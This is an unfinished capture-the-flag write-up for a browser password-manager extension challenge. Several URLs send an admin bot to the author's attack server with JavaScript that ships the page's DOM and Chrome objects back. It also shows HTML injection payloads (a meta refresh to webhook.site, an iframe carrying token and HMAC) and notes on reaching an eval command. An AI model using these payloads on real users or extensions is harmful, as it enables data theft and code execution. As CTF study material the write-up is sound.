---
created: 2024-06-29T18:39
updated: 2024-07-07T23:06
---

**FAILED TO SOLVE**

I am allowed to make the bot visit any website, so...

## Analyze

The bot's window has some extra keys

```js
['event', 'fence', 'sharedStorage', 'fetchLater', 'onpageswap', 'onpagereveal', 'model']
```

The bot does the following things
- Goto https://pwnypass.c.hc.lc/login.php
- Fill up username password and submits
- Goto my URL

Sending it to `https://attack.octo-kumo.me/attack/uiuctf?extra=track({chrome:chrome})`

### Chrome
Turns out chrome is accessible.

Sending it to `https://attack.octo-kumo.me/attack/uiuctf?extra=track({a:analyze(chrome)})&no`

```json
{
    "loadTimes:function": {
        "requestTime": 1719704395.397,
        "startLoadTime": 1719704395.397,
        "commitLoadTime": 1719704395.543,
        "finishDocumentLoadTime": 0,
        "finishLoadTime": 0,
        "firstPaintTime": 0,
        "firstPaintAfterLoadTime": 0,
        "navigationType": "Other",
        "wasFetchedViaSpdy": true,
        "wasNpnNegotiated": true,
        "npnNegotiatedProtocol": "h3",
        "wasAlternateProtocolAvailable": false,
        "connectionInfo": "h3"
    },
    "csi:function": {
        "startE": 1719704395397,
        "onloadT": 0,
        "pageT": 155.841,
        "tran": 15
    },
    "app:object": {
        "isInstalled:boolean": false,
        "getDetails:function": null,
        "getIsInstalled:function": false,
        "runningState:function": "cannot_run",
        "InstallState:object": {
            "DISABLED:string": "disabled",
            "INSTALLED:string": "installed",
            "NOT_INSTALLED:string": "not_installed"
        },
        "RunningState:object": {
            "CANNOT_RUN:string": "cannot_run",
            "READY_TO_RUN:string": "ready_to_run",
            "RUNNING:string": "running"
        }
    }
}
```

Nothing interesting... Maybe add some delay?

Sending it to `https://attack.octo-kumo.me/attack/uiuctf?extra=setTimeout(()=>{track({a:genTree(document),b:allInputs()})},5000)&no`

Theres a DIV element added.

Send `https://attack.octo-kumo.me/attack/uiuctf?extra=setTimeout(()=>{track({a:document.body.innerHTML})},5000)&no`

```html
<div class="pwnypass-autofill-host" style="position: fixed !important; z-index: 9999 !important; inset: 0px !important; pointer-events: none !important;"></div>
```

hrmm...

### Background.js

```js
async function evaluate(_origin, data) {
    return eval(data);
}


const commands = {
    read,
    write,
    evaluate // DEPRECATED! Will be removed in next release.
}
```

Then I realized this.

So what's between me and that sweat `eval`? A custom token.

```js
if (await doHmac(token) !== hmac) return;                       // I need to obtain hmac from issue
let [ts, tab, origin, command] = token.split("|");              // payload be [time, tabid, mytab, 'evaluate','code','dummy']
if (parseInt(ts) + 60*5 < Math.floor(Date.now()/1000)) return;  // i have 5 minutes
if (sender.tab.id !== parseInt(tab)) return;                    // it must be from the same tab
if (await getOrigin(parseInt(tab)) !== origin) return;          // the tab must be of that origin
```

### Autofill.js

We can inject into that little popup via username and password.

```html
<meta http-equiv="refresh" content="0; url=https://webhook.site">
```

It works but is not useful.

I can also inject an iframe.

```html
<iframe src="./autofill.html?token=TOKEN&hmac=HMAC"></iframe>
```

It allows me to pass any token and hmac, but I still have to obtain their values first.

... Idk.
